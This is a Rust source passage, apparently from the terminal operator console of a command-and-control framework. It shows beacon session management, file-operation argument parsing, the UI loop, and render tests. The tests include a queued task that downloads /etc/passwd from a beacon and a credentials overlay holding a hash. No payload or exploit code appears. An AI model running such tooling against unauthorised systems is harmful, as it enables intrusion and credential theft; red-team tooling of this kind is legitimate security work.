        let Some(s) = self.current_session().cloned() else {
            self.log("! select a beacon first", Level::Err);
            return (op, None);
        };
        let path = match args.split_whitespace().next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <path>"), Level::Warn);
                return (op, None);
            }
        };
        (op, Some((s, path)))
    }

    /// 双参数文件操作（mv/cp）的参数解析。返回 (op_string, Some((session, src, dst)))。
    fn fileop_two_args(
        &mut self,
        name: &str,
        args: &str,
    ) -> (String, Option<(SessionView, String, String)>) {
        let op = name.trim_start_matches('/').to_string();
        let Some(s) = self.current_session().cloned() else {
            self.log("! select a beacon first", Level::Err);
            return (op, None);
        };
        let mut it = args.split_whitespace();
        let src = match it.next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <src> <dst>"), Level::Warn);
                return (op, None);
            }
        };
        let dst = match it.next() {
            Some(p) => p.to_string(),
            None => {
                self.log(&format!("usage: {name} <src> <dst>"), Level::Warn);
                return (op, None);
            }
        };
        (op, Some((s, src, dst)))
    }

    /// 处理 session 元数据命令：/rename /tag /untag /star /note。
    /// id 参数支持前缀匹配（和 /use 一致），找到后改 sessions_meta 并 save。
    fn session_meta_cmd(&mut self, name: &str, args: &str) {
        let mut parts = args.splitn(2, char::is_whitespace);
        let id_prefix = match parts.next() {
            Some(id) if !id.is_empty() => id,
            _ => {
                self.log(&format!("usage: {name} <id-prefix> <value>"), Level::Warn);
                return;
            }
        };
        let value = parts.next().unwrap_or("").trim();
        // 前缀匹配 session id
        let full_id = match self.sessions.iter().find(|s| s.id.starts_with(id_prefix)) {
            Some(s) => s.id.clone(),
            None => {
                self.log(&format!("! no beacon matching {id_prefix}"), Level::Err);
                return;
            }
        };
        match name {
            "/rename" => {
                if value.is_empty() {
                    self.log("usage: /rename <id> <name>", Level::Warn);
                    return;
                }
                self.sessions_meta.rename(&full_id, value);
                self.persist_meta(&full_id, &format!("renamed → {value}"));
            }
            "/tag" => {
                if value.is_empty() {
                    self.log("usage: /tag <id> <tag>", Level::Warn);
                    return;
                }
                self.sessions_meta.tag(&full_id, value);
                self.persist_meta(&full_id, &format!("+tag {value}"));
            }
            "/untag" => {
                if value.is_empty() {
                    self.log("usage: /untag <id> <tag>", Level::Warn);
                    return;
                }
                self.sessions_meta.untag(&full_id, value);
                self.persist_meta(&full_id, &format!("-tag {value}"));
            }
            "/star" => {
                self.sessions_meta.toggle_star(&full_id);
                let m = self.sessions_meta.get(&full_id);
                let msg = if m.favorite {
                    "★ starred"
                } else {
                    "unstarred"
                };
                self.persist_meta(&full_id, msg);
            }
            "/note" => {
                if value.is_empty() {
                    self.log("usage: /note <id> <text>", Level::Warn);
                    return;
                }
                self.sessions_meta.note(&full_id, value);
                self.persist_meta(&full_id, "note saved");
            }
            _ => {}
        }
    }

    /// sessions_meta 变更后保存 + 日志确认。
    fn persist_meta(&mut self, id: &str, msg: &str) {
        match self.sessions_meta.save() {
            Ok(()) => self.log(&format!("[{}] {msg}", short(id)), Level::Ok),
            Err(e) => self.log(&format!("! save sessions_meta: {e}"), Level::Err),
        }
    }
}

enum ShellFor {
    Ls,
    Ps,
    Creds,
}

/// `Down` 键历史导航的动作。三态表达比 `Option<(bool, String)>` 更清晰：
/// `Pick` = 取下一条历史填入输入框；`Clear` = 已到末尾，清空回到底部；
/// `None`（外层 Option）= 没有 hist_idx 时什么都不做。
enum HistoryNav {
    Pick(String),
    Clear,
}

pub(super) fn short(s: &str) -> String {
    s.chars().take(8).collect()
}

/// 从剩余叶里挑屏幕中心距离 `closed_rect` 最近的那个（UX-S4 焦点回退）。
/// `closed_rect` 是被关窗格关闭前的位置；None 或无剩余叶时返回 None。
fn pick_nearest_leaf(
    remaining: &[(usize, ratatui::layout::Rect)],
    closed_rect: Option<ratatui::layout::Rect>,
) -> Option<usize> {
    let target = closed_rect?;
    let (tcx, tcy) = (
        (target.x + target.width / 2) as i64,
        (target.y + target.height / 2) as i64,
    );
    remaining
        .iter()
        .map(|(id, r)| {
            let (cx, cy) = ((r.x + r.width / 2) as i64, (r.y + r.height / 2) as i64);
            let dist = (cx - tcx).pow(2) + (cy - tcy).pow(2);
            (*id, dist)
        })
        .min_by_key(|(_, d)| *d)
        .map(|(id, _)| id)
}

/// 把秒数格式化成紧凑时长：`1h02m` / `3m10s` / `45s` / `0s`。
pub(super) fn fmt_age(secs: u64) -> String {
    let h = secs / 3600;
    let m = (secs % 3600) / 60;
    let s = secs % 60;
    if h > 0 {
        format!("{h}h{m:02}m")
    } else if m > 0 {
        format!("{m}m{s:02}s")
    } else {
        format!("{s}s")
    }
}

/// 在拓扑图里显示节点的短标签（label 或 id 前 8 字符）。
pub(super) fn short_topo(topo: &topology::Topology, id: &str) -> String {
    topo.nodes
        .iter()
        .find(|n| n.id == id)
        .map(|n| n.label.clone())
        .unwrap_or_else(|| short(id))
}

// ---- entry -----------------------------------------------------------------

pub fn run(server: &str, token: Option<&str>) -> anyhow::Result<()> {
    enable_raw_mode()?;
    let mut stdout = stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let bridge = rest::spawn(server.to_string(), token.map(|t| t.to_string()));
    let mut app = App::new(bridge);
    // 初始化主题：根据配置文件 theme 字段 + NO_COLOR 环境变量选定调色板。
    // 必须在首次 render 前调用（render 会读 theme::current()）。
    crate::theme::init(&app.config.theme);

    let result = main_loop(&mut terminal, &mut app);

    // restore
    disable_raw_mode()?;
    execute!(
        terminal.backend_mut(),
        LeaveAlternateScreen,
        DisableMouseCapture
    )?;
    terminal.show_cursor()?;
    result
}

fn main_loop(
    terminal: &mut Terminal<CrosstermBackend<io::Stdout>>,
    app: &mut App,
) -> anyhow::Result<()> {
    while !app.should_quit {
        // prefix 超时自动复位（UX-S5）：按 Ctrl+B 后 2s 内未按有效键则退出 prefix
        // 模式，防止操作员分心后误触改布局。放在 draw 前保证状态栏及时反映。
        if app.tmux_prefix
            && app
                .prefix_since
                .is_some_and(|t| t.elapsed() > Duration::from_secs(2))
        {
            app.tmux_prefix = false;
            app.prefix_since = None;
        }
        terminal.draw(|f| render(app, f))?;
        // poll input at ~33ms cadence（P1-3）。之前 100ms 导致 worker 快照最多
        // 延迟 ~200ms 才渲染（人眼可感卡顿）。降到 33ms（~30fps 上限）后端到端
        // 延迟 <70ms，CPU 成本可忽略（poll 空转极廉价）。
        if event::poll(Duration::from_millis(33))? {
            match event::read()? {
                Event::Key(key) => app.handle_key(key),
                Event::Mouse(ev) => app.handle_mouse(ev),
                // Resize events just force a redraw next iteration (draw is at
                // the top of the loop); nothing else to do.
                Event::Resize(_, _) => {}
                _ => {}
            }
        }
        app.poll_worker();
    }
    let _ = app.bridge.cmds.send(Cmd::Shutdown);
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use input::{classify, mask};

    // ---- classify (pure) ----

    #[test]
    fn classify_empty_is_empty() {
        assert_eq!(classify(""), Input::Empty);
        assert_eq!(classify("   "), Input::Empty);
    }

    #[test]
    fn classify_plain_is_shell() {
        assert_eq!(classify("whoami"), Input::Shell("whoami".into()));
        assert_eq!(classify("  ls -la  "), Input::Shell("ls -la".into()));
    }

    #[test]
    fn classify_slash_is_meta_split() {
        assert_eq!(
            classify("/use abc123"),
            Input::Meta {
                name: "/use".into(),
                args: "abc123".to_string()
            }
        );
        assert_eq!(
            classify("/LS /tmp"),
            Input::Meta {
                name: "/ls".into(),
                args: "/tmp".to_string()
            }
        );
    }

    #[test]
    fn classify_meta_no_args() {
        assert_eq!(
            classify("/ps"),
            Input::Meta {
                name: "/ps".into(),
                args: String::new()
            }
        );
    }

    // ---- filter_meta (pure) ----

    #[test]
    fn filter_empty_returns_all() {
        assert_eq!(filter_meta("").len(), META_COMMANDS.len());
    }

    #[test]
    fn filter_slash_returns_all() {
        assert_eq!(filter_meta("/").len(), META_COMMANDS.len());
    }

    #[test]
    fn filter_prefix_matches_subset() {
        let got = filter_meta("/l");
        let names: Vec<&str> = got.iter().map(|m| m.name).collect();
        assert_eq!(names, vec!["/ls"]);
    }

    #[test]
    fn filter_unknown_returns_empty() {
        assert!(filter_meta("/zzz").is_empty());
    }

    // ---- popup selection movement (pure) ----

    #[test]
    fn popup_move_down_increments() {
        // mid-list: 0 → 1 → 2
        assert_eq!(move_popup_selection(5, Some(0), PopupMove::Down), Some(1));
        assert_eq!(move_popup_selection(5, Some(1), PopupMove::Down), Some(2));
    }

    #[test]
    fn popup_move_down_wraps_to_top() {
        // at last index → wraps to 0
        assert_eq!(move_popup_selection(5, Some(4), PopupMove::Down), Some(0));
    }

    #[test]
    fn popup_move_up_decrements() {
        assert_eq!(move_popup_selection(5, Some(3), PopupMove::Up), Some(2));
    }

    #[test]
    fn popup_move_up_wraps_to_bottom() {
        // at 0 → wraps to last index
        assert_eq!(move_popup_selection(5, Some(0), PopupMove::Up), Some(4));
    }

    #[test]
    fn popup_move_none_current_defaults_to_first() {
        assert_eq!(move_popup_selection(3, None, PopupMove::Down), Some(1));
    }

    #[test]
    fn popup_move_empty_list_is_none() {
        assert_eq!(move_popup_selection(0, None, PopupMove::Down), None);
        assert_eq!(move_popup_selection(0, Some(0), PopupMove::Up), None);
    }

    #[test]
    fn popup_move_single_item_stays() {
        assert_eq!(move_popup_selection(1, Some(0), PopupMove::Down), Some(0));
        assert_eq!(move_popup_selection(1, Some(0), PopupMove::Up), Some(0));
    }

    // ---- popup submit resolution (pure) ----

    #[test]
    fn popup_submit_explicit_selection_wins() {
        // /sl 唯一匹配 /sleep，显式选中 index 0 必须返回 "/sleep"（精确断言）
        assert_eq!(popup_submit_target("/sl", Some(0)), Some("/sleep"));
    }

    #[test]
    fn popup_submit_selection_returns_exact_command() {
        // 用唯一前缀 + 显式选中，锁死具体返回值（不依赖数组顺序）
        let target = popup_submit_target("/ta", Some(0));
        assert_eq!(target, Some("/tag"));
    }

    #[test]
    fn popup_submit_unique_prefix_auto_resolves() {
        // "/ls" only matches /ls → resolves even without selection.
        assert_eq!(popup_submit_target("/ls", None), Some("/ls"));
    }

    #[test]
    fn popup_submit_ambiguous_without_selection_is_none() {
        // "/s" matches several; no selection → can't resolve.
        let filtered = filter_meta("/s");
        assert!(
            filtered.len() > 1,
            "test precondition: /s should be ambiguous"
        );
        assert_eq!(popup_submit_target("/s", None), None);
    }

    #[test]
    fn popup_submit_non_command_input_is_none() {
        // plain shell text, no popup context
        assert_eq!(popup_submit_target("whoami", None), None);
    }

    // ---- scroll (pure) ----

    #[test]
    fn scroll_up_increases_offset() {
        assert_eq!(apply_scroll(0, ScrollDir::Up, 3), 3);
        assert_eq!(apply_scroll(5, ScrollDir::Up, 3), 8);
    }

    #[test]
    fn scroll_down_decreases_offset_toward_zero() {
        assert_eq!(apply_scroll(5, ScrollDir::Down, 3), 2);
    }

    #[test]
    fn scroll_down_clamps_at_zero() {
        // can't go below 0 (stays pinned to the latest / live-tail)
        assert_eq!(apply_scroll(2, ScrollDir::Down, 10), 0);
        assert_eq!(apply_scroll(0, ScrollDir::Down, 5), 0);
    }

    #[test]
    fn scroll_up_saturates_instead_of_overflowing() {
        assert_eq!(apply_scroll(usize::MAX, ScrollDir::Up, 1), usize::MAX);
    }

    // ---- mask ----

    #[test]
    fn mask_short_is_all_dots() {
        assert_eq!(mask("ab"), "••••");
        assert_eq!(mask("abcd"), "••••");
    }

    #[test]
    fn mask_long_keeps_ends() {
        assert_eq!(mask("hunter2"), "hu••••r2");
    }

    // ---- short (pure) ----

    #[test]
    fn short_ascii_takes_8() {
        assert_eq!(short("a1b2c3d4e5f6"), "a1b2c3d4");
    }

    #[test]
    fn short_short_string_unchanged() {
        assert_eq!(short("abc"), "abc");
    }

    #[test]
    fn short_non_ascii_no_panic() {
        // 中文：每个字符是多字节，chars().take(8) 按字符不截断 UTF-8
        let cn = short("这是中文的会话标识符测试");
        assert!(cn.chars().count() <= 8);
        // emoji
        let em = short("🔑🎯🚀💻📦🔧🔨⚡🎉");
        assert!(em.chars().count() <= 8);
        // 不 panic 就是关键（字节切片会崩）
    }

    // ---- parse_sleep_args (pure) ----

    #[test]
    fn sleep_seconds_only() {
        assert!(matches!(parse_sleep_args("5"), SleepSpec::Seconds(5)));
    }

    #[test]
    fn sleep_seconds_and_jitter() {
        assert!(matches!(
            parse_sleep_args("5 20%"),
            SleepSpec::SecondsJitter(5, 20)
        ));
    }

    #[test]
    fn sleep_jitter_without_percent_sign() {
        assert!(matches!(
            parse_sleep_args("5 20"),
            SleepSpec::SecondsJitter(5, 20)
        ));
    }

    #[test]
    fn sleep_missing_seconds_is_usage() {
        assert!(matches!(parse_sleep_args(""), SleepSpec::Usage(_)));
        assert!(matches!(parse_sleep_args("abc"), SleepSpec::Usage(_)));
    }

    #[test]
    fn sleep_bad_jitter_is_usage() {
        assert!(matches!(parse_sleep_args("5 xyz"), SleepSpec::Usage(_)));
    }

    #[test]
    fn sleep_jitter_clamped_to_100() {
        match parse_sleep_args("5 999") {
            SleepSpec::SecondsJitter(_, j) => assert_eq!(j, 100),
            other => panic!("expected SecondsJitter, got {other:?}"),
        }
    }

    // ---- render smoke tests (TestBackend; prove draw never panics) ----

    use ratatui::backend::TestBackend;
    use ratatui::Terminal;

    /// Build an App with a fake pair of unconnected channels (no worker thread).
    fn fake_app() -> App {
        let (snap_tx, snap_rx) = std::sync::mpsc::channel();
        let (cmd_tx, cmd_rx) = std::sync::mpsc::channel();
        // drop the senders so try_recv always returns Empty (worker absent).
        drop(snap_tx);
        drop(cmd_rx);
        App::new(Bridge {
            snapshots: snap_rx,
            cmds: cmd_tx,
        })
    }

    #[test]
    fn render_does_not_panic_empty() {
        let mut app = fake_app();
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_stream_and_popup() {
        let mut app = fake_app();
        app.connected = true;
        app.log("[a1b2c3] $ whoami", Level::Info);
        app.log("DEV\\alice", Level::Ok);
        app.log("! some error", Level::Err);
        // 字段已迁移到 per-pane PaneState（P0-2）：通过 focused_state_mut 设置。
        {
            let st = app.focused_state_mut();
            st.input = "/l".into();
            st.popup_open = true;
        }
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_files_overlay() {
        let mut app = fake_app();
        app.overlay = Overlay::Files(vec![
            FileEntry {
                name: "notes.txt".into(),
                size: 1234,
                is_dir: false,
                modified: "May 21".into(),
            },
            FileEntry {
                name: "sub".into(),
                size: 0,
                is_dir: true,
                modified: "May 21".into(),
            },
        ]);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_sessions_overlay() {
        use crate::types::SessionView;
        let mut app = fake_app();
        app.sessions = vec![SessionView {
            id: "a1b2c3d4e5f6".into(),
            hostname: "host01".into(),
            username: "alice".into(),
            os: "macos".into(),
            is_admin: 1,
            pending: 0,
            beacon_id: 7,
            arch: 4,
            pid: 1234,
            ..Default::default()
        }];
        if let Some(s) = app.sessions.first() {
            app.pane_tree
                .set_session_id(app.focused_pane, Some(s.id.clone()));
        }
        let mut st = ListState::default();
        st.select(Some(0));
        app.overlay = Overlay::Sessions(st);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    /// 鼠标点击 Sessions overlay 的行确实切换 session（核心交互测试）。
    /// 之前 List widget 滚动偏移导致 click 坐标映射失效；改用 hit regions 后修复。
    #[test]
    fn click_on_sessions_overlay_row_switches_session() {
        use crate::types::SessionView;
        use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
        let mut app = fake_app();
        // 两个 session，当前选第一个。
        app.sessions = vec![
            SessionView {
                id: "aaaa1111aaaa".into(),
                hostname: "hostA".into(),
                username: "alice".into(),
                os: "linux".into(),
                beacon_id: 1,
                ..Default::default()
            },
            SessionView {
                id: "bbbb2222bbbb".into(),
                hostname: "hostB".into(),
                username: "bob".into(),
                os: "macos".into(),
                beacon_id: 2,
                ..Default::default()
            },
        ];
        app.pane_tree
            .set_session_id(app.focused_pane, Some("aaaa1111aaaa".into()));
        let mut st = ListState::default();
        st.select(Some(0));
        app.overlay = Overlay::Sessions(st);
        // render 一帧，让 session_row_rects 被填充。
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        // 确认 hit regions 至少 2 行。
        assert!(
            app.session_row_rects.len() >= 2,
            "应记录至少 2 行 hit region"
        );
        // 点击第 2 行（hostB）的中间位置。
        let row2 = app.session_row_rects[1];
        let click_col = row2.x + 5;
        let click_row = row2.y;
        app.handle_mouse(MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: click_col,
            row: click_row,
            modifiers: crossterm::event::KeyModifiers::empty(),
        });
        // 验证焦点窗格的 session 切到了 bbbb2222（hostB）。
        let selected = app.pane_tree.get_session_id(app.focused_pane);
        assert_eq!(
            selected.as_deref(),
            Some("bbbb2222bbbb"),
            "点击 hostB 行应切换到该 session，got {selected:?}"
        );
        // overlay 应关闭。
        assert!(!app.overlay.is_open(), "点击后 overlay 应关闭");
    }

    /// 点击窗格 SessionList 视图的行切换该窗格的 session（核心交互）。
    /// 从 console 切到 sessions 视图后，点列表里的 beacon 行 → 该窗格绑定它。
    #[test]
    fn click_pane_sessionlist_row_switches_pane_session() {
        use crate::types::SessionView;
        use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
        let mut app = fake_app();
        // 两个 session。
        app.sessions = vec![
            SessionView {
                id: "aaaa1111aaaa".into(),
                hostname: "hostA".into(),
                username: "alice".into(),
                os: "linux".into(),
                beacon_id: 1,
                ..Default::default()
            },
            SessionView {
                id: "bbbb2222bbbb".into(),
                hostname: "hostB".into(),
                username: "bob".into(),
                os: "macos".into(),
                beacon_id: 2,
                ..Default::default()
            },
        ];
        // 焦点窗格设为 SessionList 视图，初始绑 hostA。
        app.pane_tree = app
            .pane_tree
            .clone()
            .set_view(app.focused_pane, panes::PaneView::SessionList);
        app.pane_tree
            .set_session_id(app.focused_pane, Some("aaaa1111aaaa".into()));
        // render 一帧，让 pane_session_rows 被填充。
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        // 确认 hit regions 有 2 行。
        let rows = app
            .pane_session_rows
            .get(&app.focused_pane)
            .expect("焦点窗格应有 session 行 hit regions");
        assert!(rows.len() >= 2, "应记录至少 2 行");
        // 点击第 2 行（hostB）。
        let (row2_rect, _) = &rows[1];
        app.handle_mouse(MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: row2_rect.x + 5,
            row: row2_rect.y,
            modifiers: crossterm::event::KeyModifiers::empty(),
        });
        // 验证焦点窗格切到 hostB。
        let selected = app.pane_tree.get_session_id(app.focused_pane);
        assert_eq!(
            selected.as_deref(),
            Some("bbbb2222bbbb"),
            "点击 hostB 行应切换该窗格 session"
        );
    }

    /// SessionList 当前 session 行有高亮背景（surface1），其他行没有。
    /// 之前高亮没显示因为背景只部分应用；现在整行填满。
    #[test]
    fn sessionlist_current_row_has_highlight_background() {
        use crate::types::SessionView;
        let mut app = fake_app();
        app.sessions = vec![
            SessionView {
                id: "aaaa1111aaaa".into(),
                hostname: "hostA".into(),
                username: "alice".into(),
                os: "linux".into(),
                beacon_id: 1,
                ..Default::default()
            },
            SessionView {
                id: "bbbb2222bbbb".into(),
                hostname: "hostB".into(),
                username: "bob".into(),
                os: "macos".into(),
                beacon_id: 2,
                ..Default::default()
            },
        ];
        // 焦点窗格 SessionList 视图，绑 hostA（第一行应高亮）。
        app.pane_tree = app
            .pane_tree
            .clone()
            .set_view(app.focused_pane, panes::PaneView::SessionList);
        app.pane_tree
            .set_session_id(app.focused_pane, Some("aaaa1111aaaa".into()));
        let backend = TestBackend::new(80, 24);
        let mut term = Terminal::new(backend).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        let buf = term.backend().buffer();

        // 第一行（hostA，当前）的背景应是 surface1；第二行（hostB）不是。
        // 第一行（hostA，当前）的背景应是 accent_dim（selected 样式，蓝色高亮）。
        let accent_dim = crate::theme::accent_dim();
        let mut found_highlight = false;
        for y in 2u16..20u16 {
            let cell = &buf[(5, y)]; // x=5 在 hostname 区域内
                                     // selected 用 accent_dim 背景前景。检查 bg 是否是 accent_dim。
            if cell.bg == accent_dim {
                found_highlight = true;
                break;
            }
        }
        assert!(
            found_highlight,
            "当前 session 行应有 accent_dim 蓝色高亮背景"
        );
    }

    /// /theme 命令切换主题：switch 后颜色访问器返回新调色板的值。
    #[test]
    fn theme_switch_changes_active_palette() {
        // switch 到 highcontrast 后，accent 应变成 Cyan（high_contrast 预设）。
        crate::theme::switch("highcontrast");
        assert_eq!(crate::theme::accent(), ratatui::style::Color::Cyan);
        // 恢复 mocha 避免污染其他测试。
        crate::theme::switch("mocha");
        assert_eq!(crate::theme::accent(), crate::theme::ACCENT);
    }

    #[test]
    fn age_for_returns_baseline_when_just_recorded() {
        // 客户端推算：刚记下的基线 (now, 100)，elapsed≈0 → age_for 仍为 100。
        let mut app = fake_app();
        app.age_baseline
            .insert("a1b2c3d4".into(), (Instant::now(), 100));
        assert_eq!(app.age_for("a1b2c3d4"), 100);
    }

    #[test]
    fn age_for_returns_zero_for_unknown_session() {
        // 没有基线的会话 → 0（不会 panic）。
        let app = fake_app();
        assert_eq!(app.age_for("never-seen"), 0);
    }

    #[test]
    fn fmt_age_formats_compactly() {
        assert_eq!(fmt_age(0), "0s");
        assert_eq!(fmt_age(45), "45s");
        assert_eq!(fmt_age(190), "3m10s");
        assert_eq!(fmt_age(3725), "1h02m");
    }

    #[test]
    fn render_does_not_panic_with_session_detail_overlay() {
        // /info 详情 overlay——覆盖 ja3/ja4/pid/pending/age + 本地 meta 的渲染路径。
        use crate::types::SessionView;
        let mut app = fake_app();
        app.sessions = vec![SessionView {
            id: "a1b2c3d4e5f6".into(),
            hostname: "host01".into(),
            username: "alice".into(),
            os: "macos".into(),
            is_admin: 1,
            pending: 2,
            beacon_id: 7,
            arch: 4,
            pid: 1234,
            ja3: Some("e7d705a3286e19ea42f587b344ee6865".into()),
            ja4: Some("t13d0400_002b_c8dd0a8e8c9b".into()),
            ..Default::default()
        }];
        app.age_baseline
            .insert("a1b2c3d4e5f6".into(), (Instant::now(), 300));
        app.overlay = Overlay::SessionDetail("a1b2c3d4e5f6".into());
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_tasks_overlay() {
        // /tasks 排队任务 overlay。
        let mut app = fake_app();
        app.overlay = Overlay::Tasks(vec![
            crate::rest::TaskRow {
                task_id: 42,
                command: serde_json::json!({"type": "shell", "args": "whoami"}),
            },
            crate::rest::TaskRow {
                task_id: 43,
                command: serde_json::json!({"type": "download", "path": "/etc/passwd"}),
            },
        ]);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_procs_and_creds_overlay() {
        let mut app = fake_app();
        app.overlay = Overlay::Procs(vec![ProcEntry {
            pid: 1,
            ppid: 0,
            name: "launchd".into(),
            user: "root".into(),
        }]);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();

        app.overlay = Overlay::Creds(vec![CredEntry {
            source: "DEV".into(),
            principal: "alice".into(),
            kind: crate::types::CredKind::Hash,
            secret: "8846f7".into(),
        }]);
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_split_panes() {
        // tmux 式分屏：Ctrl+% 后两个窗格，渲染不崩
        let mut app = fake_app();
        let new_id = app.pane_tree.next_id(); // == 2
        app.pane_tree = panes::Pane::single(1).split(1, panes::SplitDir::Columns, new_id);
        app.focused_pane = new_id; // 新叶 id = 2
        app.log("[a1b2c3] $ whoami", Level::Info);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn render_does_not_panic_with_different_pane_views() {
        // 焦点窗格切换为 Files 视图，渲染不崩
        let mut app = fake_app();
        let nid1 = panes::Pane::single(1).next_id(); // == 2
        app.pane_tree = panes::Pane::single(1)
            .split(1, panes::SplitDir::Rows, nid1)
            .set_view(nid1, panes::PaneView::SessionList);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    /// 单 tab：render 后焦点窗格有一个 view_tab_rect hit region，
    /// buffer 含当前视图名（console）+ ▾ 下拉指示。
    #[test]
    fn view_tab_renders_current_view_with_dropdown_arrow() {
        let mut app = fake_app();
        let mut term = Terminal::new(TestBackend::new(120, 30)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        // 焦点窗格（id=1）应有 1 个 view tab hit region。
        assert!(
            app.view_tab_rect.contains_key(&1),
            "焦点窗格应有 view tab hit region"
        );
        // buffer 应含当前视图名 + ▾。
        let buf_str: String = term
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect();
        assert!(buf_str.contains("console"), "应显示当前视图名 console");
        assert!(buf_str.contains('▾'), "应显示下拉箭头 ▾");
    }

    /// view picker 打开后：render 画出全部 6 个视图选项。
    #[test]
    fn view_picker_renders_all_views_when_open() {
        let mut app = fake_app();
        // 手动打开 id=1 窗格的 picker。
        app.view_picker = Some((1, ratatui::widgets::ListState::default()));
        let mut term = Terminal::new(TestBackend::new(120, 30)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        let buf_str: String = term
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect();
        // picker 打开时 buffer 应含全部 6 个视图 label。
        for v in panes::PaneView::ALL {
            assert!(
                buf_str.contains(v.label()),
                "picker 应列出 {:?} = '{}'",
                v,
                v.label()
            );
        }
        // 箭头应变 ▴（菜单已展开）。
        assert!(buf_str.contains('▴'), "picker 开时箭头应变 ▴");
    }

    /// 窄终端下单 tab 仍能正常渲染（不像旧 6-tab 设计会挤爆）。
    #[test]
    fn single_tab_survives_narrow_pane() {
        let mut app = fake_app();
        let nid = app.pane_tree.next_id();
        app.pane_tree =
            app.pane_tree
                .clone()
                .split(app.focused_pane, panes::SplitDir::Columns, nid);
        // 窄终端，多分屏——单 tab 设计应不挤、不 panic。
        let mut term = Terminal::new(TestBackend::new(40, 20)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        // 每个窗格都应有自己的 tab rect。
        assert!(app.view_tab_rect.len() >= 2);
    }

    /// 输入框渲染修复回归测试：prompt 内容（tag + ❯ + 输入）必须画在内容区
    /// （去掉边框+padding 后），不能覆盖顶部边框行。之前 inner=area 的 bug
    /// 导致 prompt 画在边框上。现在用 block.inner(area) 正确收缩。
    #[test]
    fn input_prompt_renders_inside_block_not_on_border() {
        let mut app = fake_app();
        // 模拟有输入的状态。
        {
            let st = app.focused_state_mut();
            st.input = "whoami".into();
            st.cursor = 6;
        }
        let backend = TestBackend::new(80, 24);
        let mut term = Terminal::new(backend).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        let buf = term.backend().buffer();

        // 输入框区域：底部 3 行（chunks[2]，y=21..23）。顶部边框在 y=21，
        // 内容在 y=22。验证 prompt 文本在 y=22（内容行），不在 y=21（边框行）。
        // 收集 y=21 和 y=22 两行的内容。
        let row_at = |y: usize| -> String {
            (0..80)
                .map(|x| {
                    buf[(x as u16, y as u16)]
                        .symbol()
                        .chars()
                        .next()
                        .unwrap_or(' ')
                })
                .collect()
        };
        let border_row = row_at(21);
        let content_row = row_at(22);
        // 边框行应含圆角分隔线（═ 或 ╭ 或 ' input ' 标题），不含 "whoami"。
        assert!(
            !border_row.contains("whoami"),
            "prompt 不应画在边框行；border_row={border_row:?}"
        );
        // 内容行应含输入文本 "whoami"。
        assert!(
            content_row.contains("whoami"),
            "prompt 应画在内容行；content_row={content_row:?}"
        );
        // 内容行还应含 ❯ 提示符和 [no beacon] 标签（fake_app 无 session）。
        assert!(content_row.contains("❯"), "内容行应有 ❯ 提示符");
        assert!(
            content_row.contains("[no beacon]"),
            "内容行应有 session 标签"
        );
    }

    #[test]
    fn files_pane_renders_cached_data_not_placeholder() {
        // BUG 2: the Files pane view used a hardcoded empty vec and always showed
        // "(files — use /ls to populate)". Now it renders App::files_view. Pin:
        // with files_view populated and a pane set to PaneView::Files, the drawn
        // buffer contains the file name — proving the real data flows through.
        let mut app = fake_app();
        app.files_view = vec![FileEntry {
            name: "secret.txt".into(),
            size: 4096,
            is_dir: false,
            modified: "Jan 01".into(),
        }];
        app.pane_tree = app.pane_tree.clone().set_view(1, panes::PaneView::Files);
        let backend = TestBackend::new(80, 24);
        let mut term = Terminal::new(backend).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        let buf = term.backend().buffer().clone();
        let rendered: String = buf.content().iter().map(|c| c.symbol()).collect();
        assert!(
            rendered.contains("secret.txt"),
            "Files pane must render the cached file name, not a placeholder"
        );
        assert!(
            !rendered.contains("use /ls to populate"),
            "Files pane must NOT show the placeholder when data is present"
        );
    }

    #[test]
    fn files_pane_shows_placeholder_when_empty() {
        // Empty cache → the hint is still shown (operator is told how to populate).
        let mut app = fake_app();
        app.pane_tree = app.pane_tree.clone().set_view(1, panes::PaneView::Files);
        let backend = TestBackend::new(80, 24);
        let mut term = Terminal::new(backend).unwrap();
